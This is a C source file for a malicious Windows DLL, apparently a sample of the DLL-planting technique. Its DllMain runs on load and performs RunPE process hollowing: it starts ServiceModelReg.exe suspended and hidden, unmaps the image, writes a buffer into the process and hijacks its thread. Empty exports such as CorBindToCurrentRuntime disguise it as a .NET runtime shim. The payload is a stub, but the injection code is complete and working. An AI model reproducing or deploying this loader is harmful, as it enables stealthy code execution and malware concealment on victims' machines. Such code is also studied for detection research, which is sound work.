#include <windows.h>
#include <winternl.h>

// Native-language variant of the same class: a planted dependency exposes
// expected exports and performs RunPE hollowing from its load-time entry point.
typedef NTSTATUS (NTAPI *ZWUNMAPVIEWOFSECTION)(HANDLE, PVOID);

static void hollow_child(void) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    BYTE payload[1024] = { 'M', 'Z' };
    DWORD old_protect = 0;
    SIZE_T written = 0;
    const DWORD CREATE_SUSPENDED_AND_HIDDEN = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    const char *offsetToPE = "PE header offset";

    payload[0x80] = 'P';
    payload[0x81] = 'E';
    if (payload[0] != 'M' || payload[1] != 'Z' || offsetToPE == NULL)
        return;

    CreateProcessW(
        L"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ServiceModelReg.exe",
        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED_AND_HIDDEN,
        NULL, NULL, &si, &pi);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection =
        (ZWUNMAPVIEWOFSECTION)GetProcAddress(ntdll, "ZwUnmapViewOfSection");
    ZwUnmapViewOfSection(pi.hProcess, (PVOID)0x400000);

    LPVOID remote = VirtualAllocEx(pi.hProcess, (PVOID)0x400000,
        sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remote, payload, sizeof(payload), &written);
    VirtualProtectEx(pi.hProcess, remote, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);

    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rcx = (DWORD64)remote;
#else
    ctx.Eax = (DWORD)remote;
#endif
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
}

__declspec(dllexport) int LoadLibraryShim(void) { return 0; }
__declspec(dllexport) int GetRealProcAddress(void) { return 0; }
__declspec(dllexport) int CorBindToCurrentRuntime(void) { return 0; }

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(instance);
        hollow_child();
    }
    return TRUE;
}
